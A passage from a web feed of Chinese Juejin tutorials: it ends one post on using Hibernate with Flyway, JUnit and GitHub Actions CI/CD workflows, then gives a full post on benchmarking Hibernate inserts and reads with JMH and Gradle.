        user1.setEmail(<span class="hljs-string">"alice@example.com"</span>);
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user2.setName(<span class="hljs-string">"Bob"</span>);
        user2.setEmail(<span class="hljs-string">"bob@example.com"</span>);

        session.save(user1);
        session.save(user2);

        transaction.commit();
        session.close();
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-10">5. 单元测试</h3>
<p>编写单元测试来确保数据库操作的正确性。</p>
<h4 data-id="heading-11"><code>UserTest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.AfterAll;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.BeforeAll;
<span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.junit.jupiter.api.Assertions.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTest</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@BeforeAll</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        sessionFactory = config.buildSessionFactory();
    }

    <span class="hljs-meta">@AfterAll</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tearDown</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (sessionFactory != <span class="hljs-literal">null</span>) {
            sessionFactory.close();
        }
    }

    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testUserCreation</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();

        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"Charlie"</span>);
        user.setEmail(<span class="hljs-string">"charlie@example.com"</span>);
        session.save(user);

        transaction.commit();
        session.close();

        session = sessionFactory.openSession();
        <span class="hljs-type">User</span> <span class="hljs-variable">retrievedUser</span> <span class="hljs-operator">=</span> session.get(User.class, user.getId());
        session.close();

        assertNotNull(retrievedUser);
        assertEquals(<span class="hljs-string">"Charlie"</span>, retrievedUser.getName());
        assertEquals(<span class="hljs-string">"charlie@example.com"</span>, retrievedUser.getEmail());
    }
}
</code></pre>
<h3 data-id="heading-12">6. 持续集成</h3>
<p>使用GitHub Actions来自动化构建、测试和部署过程。</p>
<h4 data-id="heading-13"><code>.github/workflows/ci.yml</code></h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CI</span>

<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">main</span> ]
  <span class="hljs-attr">pull_request:</span>
    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">main</span> ]

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">services:</span>
      <span class="hljs-attr">mysql:</span>
        <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:5.7</span>
        <span class="hljs-attr">ports:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-number">3306</span><span class="hljs-string">:3306</span>
        <span class="hljs-attr">env:</span>
          <span class="hljs-attr">MYSQL_ROOT_PASSWORD:</span> <span class="hljs-string">root</span>
          <span class="hljs-attr">MYSQL_DATABASE:</span> <span class="hljs-string">devops_db</span>
          <span class="hljs-attr">MYSQL_USER:</span> <span class="hljs-string">db_user</span>
          <span class="hljs-attr">MYSQL_PASSWORD:</span> <span class="hljs-string">db_password</span>
        <span class="hljs-attr">options:</span> <span class="hljs-string">--health-cmd="mysqladmin</span> <span class="hljs-string">ping</span> <span class="hljs-string">--silent"</span> <span class="hljs-string">--health-interval=10s</span> <span class="hljs-string">--health-timeout=5s</span> <span class="hljs-string">--health-retries=3</span>

    <span class="hljs-attr">steps:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span> <span class="hljs-string">code</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">up</span> <span class="hljs-string">JDK</span> <span class="hljs-number">11</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-java@v2</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">java-version:</span> <span class="hljs-string">'11'</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Grant</span> <span class="hljs-string">execute</span> <span class="hljs-string">permission</span> <span class="hljs-string">for</span> <span class="hljs-string">gradlew</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">chmod</span> <span class="hljs-string">+x</span> <span class="hljs-string">gradlew</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">Flyway</span> <span class="hljs-string">migrations</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">flywayMigrate</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">with</span> <span class="hljs-string">Gradle</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">build</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">tests</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">test</span>
</code></pre>
<h3 data-id="heading-14">持续部署</h3>
<p>可以扩展GitHub Actions工作流，添加部署步骤。例如，部署到AWS Elastic Beanstalk：</p>
<h4 data-id="heading-15"><code>.github/workflows/cd.yml</code></h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">CD</span>

<span class="hljs-attr">on:</span>
  <span class="hljs-attr">push:</span>
    <span class="hljs-attr">branches:</span> [ <span class="hljs-string">main</span> ]

<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">deploy:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>

    <span class="hljs-attr">steps:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span> <span class="hljs-string">code</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Set</span> <span class="hljs-string">up</span> <span class="hljs-string">JDK</span> <span class="hljs-number">11</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-java@v2</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">java-version:</span> <span class="hljs-string">'11'</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Grant</span> <span class="hljs-string">execute</span> <span class="hljs-string">permission</span> <span class="hljs-string">for</span> <span class="hljs-string">gradlew</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">chmod</span> <span class="hljs-string">+x</span> <span class="hljs-string">gradlew</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Build</span> <span class="hljs-string">with</span> <span class="hljs-string">Gradle</span>
      <span class="hljs-attr">run:</span> <span class="hljs-string">./gradlew</span> <span class="hljs-string">build</span>

    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Deploy</span> <span class="hljs-string">to</span> <span class="hljs-string">Elastic</span> <span class="hljs-string">Beanstalk</span>
      <span class="hljs-attr">uses:</span> <span class="hljs-string">einaregilsson/beanstalk-deploy@v20</span>
      <span class="hljs-attr">with:</span>
        <span class="hljs-attr">region:</span> <span class="hljs-string">'us-west-2'</span>
        <span class="hljs-attr">application_name:</span> <span class="hljs-string">'MyApp'</span>
        <span class="hljs-attr">environment_name:</span> <span class="hljs-string">'MyApp-env'</span>
        <span class="hljs-attr">version_label:</span> <span class="hljs-string">'v1.0'</span>
        <span class="hljs-attr">artifact:</span> <span class="hljs-string">'build/libs/myapp.jar'</span>
      <span class="hljs-attr">env:</span>
        <span class="hljs-attr">AWS_ACCESS_KEY_ID:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.AWS_ACCESS_KEY_ID</span> <span class="hljs-string">}}</span>
        <span class="hljs-attr">AWS_SECRET_ACCESS_KEY:</span> <span class="hljs-string">${{</span> <span class="hljs-string">secrets.AWS_SECRET_ACCESS_KEY</span> <span class="hljs-string">}}</span>
</code></pre>
<h3 data-id="heading-16">例子解释</h3>
<ol>
<li><strong>Hibernate配置：</strong> 配置一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</li>
<li><strong>实体类：</strong> 创建一个简单的实体类<code>User</code>来表示数据库表中的数据。</li>
<li><strong>数据库迁移工具：</strong> 使用Flyway进行数据库迁移管理，通过Gradle配置Flyway插件。</li>
<li><strong>数据种子：</strong> 编写初始化数据的类<code>DataSeeder</code>，用于在应用程序启动时插入一些初始数据。</li>
<li><strong>单元测试：</strong> 编写单元测试<code>UserTest</code>来确保数据库操作的正确性。</li>
<li><strong>持续集成：</strong> 使用GitHub Actions来自动化构建、测试和部署过程。</li>
</ol>
<p>通过以上配置和代码示例，我们展示了如何在CI/CD流程中使用Hibernate。这包括如何配置Hibernate、定义实体类、使用Flyway进行数据库迁移、编写数据种子和单元测试，以及使用GitHub Actions实现持续集成和持续部署。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernate（86）如何在性能测试中使用Hibernate？]]></title>    <link>https://juejin.cn/post/7603219519667077139</link>    <guid>https://juejin.cn/post/7603219519667077139</guid>    <pubDate>2026-02-05T14:27:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519667077139" data-draft-id="7603219519667060755" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernate（86）如何在性能测试中使用Hibernate？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T14:27:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernate（86）如何在性能测试中使用Hibernate？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T14:27:22.000Z" title="Thu Feb 05 2026 14:27:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在性能测试中使用Hibernate，可以帮助你识别和解决与数据库访问相关的性能瓶颈。以下是一个详细的示例，结合代码讲解如何在性能测试中使用Hibernate，包括配置、性能测试工具的集成、编写性能测试脚本、分析结果等。</p>
<h3 data-id="heading-0">前提条件</h3>
<ul>
<li>使用MySQL作为数据库。</li>
<li>使用Gradle作为构建工具。</li>
<li>使用JUnit进行性能测试。</li>
<li>使用Hibernate进行ORM操作。</li>
<li>使用JMH（Java Microbenchmark Harness）进行性能基准测试。</li>
</ul>
<h3 data-id="heading-1">1. 设置Hibernate配置</h3>
<p>首先，创建一个Hibernate配置文件<code>hibernate.cfg.xml</code>，用于连接数据库。</p>
<h4 data-id="heading-2"><code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span> <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/performance_test_db<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>db_user<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>db_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">2. 创建实体类</h3>
<p>定义一个简单的实体类来表示数据库表中的数据。</p>
<h4 data-id="heading-4"><code>User.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "users")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String email;

    <span class="hljs-comment">// Getters and setters</span>
}
</code></pre>
<h3 data-id="heading-5">3. 配置Gradle</h3>
<p>在Gradle构建脚本中添加Hibernate和JMH依赖。</p>
<h4 data-id="heading-6"><code>build.gradle</code></h4>
<pre><code class="hljs language-groovy" lang="groovy">plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'org.hibernate:hibernate-core:5.6.5.Final'
    implementation 'mysql:mysql-connector-java:8.0.27'
    testImplementation 'org.junit.jupiter:junit-jupiter:5.8.2'
    implementation 'org.openjdk.jmh:jmh-core:1.32'
    annotationProcessor 'org.openjdk.jmh:jmh-generator-annprocess:1.32'
}

test {
    useJUnitPlatform()
}
</code></pre>
<h3 data-id="heading-7">4. 编写数据种子</h3>
<p>编写一个初始化数据的类，用于在应用程序启动时插入一些初始数据。</p>
<h4 data-id="heading-8"><code>DataSeeder.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSeeder</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// Configure Hibernate</span>
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> config.buildSessionFactory();

        <span class="hljs-comment">// Seed data</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
            user.setName(<span class="hljs-string">"User"</span> + i);
            user.setEmail(<span class="hljs-string">"user"</span> + i + <span class="hljs-string">"@example.com"</span>);
            session.save(user);
        }

        transaction.commit();
        session.close();
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-9">5. 编写性能测试</h3>
<p>使用JMH编写性能测试脚本，测试Hibernate操作的执行效率。</p>
<h4 data-id="heading-10"><code>UserPerformanceTest.java</code></h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;
<span class="hljs-keyword">import</span> org.openjdk.jmh.annotations.*;

<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-meta">@State(Scope.Benchmark)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserPerformanceTest</span> {
    <span class="hljs-keyword">private</span> SessionFactory sessionFactory;

    <span class="hljs-meta">@Setup(Level.Trial)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUp</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Configuration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>);
        sessionFactory = config.buildSessionFactory();
    }

    <span class="hljs-meta">@TearDown(Level.Trial)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tearDown</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (sessionFactory != <span class="hljs-literal">null</span>) {
            sessionFactory.close();
        }
    }

    <span class="hljs-meta">@Benchmark</span>
    <span class="hljs-meta">@BenchmarkMode(Mode.AverageTime)</span>
    <span class="hljs-meta">@OutputTimeUnit(TimeUnit.MILLISECONDS)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testInsertUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();

        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setName(<span class="hljs-string">"TestUser"</span>);
        user.setEmail(<span class="hljs-string">"testuser@example.com"</span>);
        session.save(user);

        transaction.commit();
        session.close();
    }

    <span class="hljs-meta">@Benchmark</span>
    <span class="hljs-meta">@BenchmarkMode(Mode.AverageTime)</span>
    <span class="hljs-meta">@OutputTimeUnit(TimeUnit.MILLISECONDS)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testReadUser</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.get(User.class, <span class="hljs-number">1L</span>);
        session.close();
    }
}
</code></pre>
<h3 data-id="heading-11">6. 运行性能测试</h3>
<p>在Gradle中添加任务来运行JMH性能测试。</p>
<h4 data-id="heading-12"><code>build.gradle</code>（添加运行JMH的任务）</h4>
<pre><code class="hljs language-groovy" lang="groovy">task runJmh(type: JavaExec) {
    main = 'org.openjdk.jmh.Main'
    classpath = sourceSets.main.runtimeClasspath
    args = ['-f', '1', '-wi', '5', '-i', '5']
}
</code></pre>
<h3 data-id="heading-13">运行性能测试</h3>
<p>使用Gradle命令运行性能测试。</p>
<pre><code class="hljs language-bash" lang="bash">./gradlew runJmh
</code></pre>
<h3 data-id="heading-14">分析结果</h3>
<p>JMH会生成性能测试的结果，包含每次操作的平均时间、吞吐量等，可以帮助你识别性能瓶颈。</p>
<h3 data-id="heading-15">例子解释</h3>
<ol>
<li><strong>Hibernate配置：</strong> 配置一个Hibernate配置文件，用于连接数据库。</li>
<li><strong>实体类：</strong> 创建一个简单的实体类来表示数据库表中的数据。</li>
<li><strong>Gradle配置：</strong> 在Gradle构建脚本中添加Hibernate和JMH依赖。</li>
<li><strong>数据种子：</strong> 编写初始化数据的类，用于在应用程序启动时插入一些初始数据。</li>
<li><strong>性能测试：</strong> 使用JMH编写性能测试脚本，测试Hibernate操作的执行效率。</li>
<li><strong>运行性能测试：</strong> 配置Gradle任务来运行JMH性能测试，使用Gradle命令执行测试。</li>
</ol>
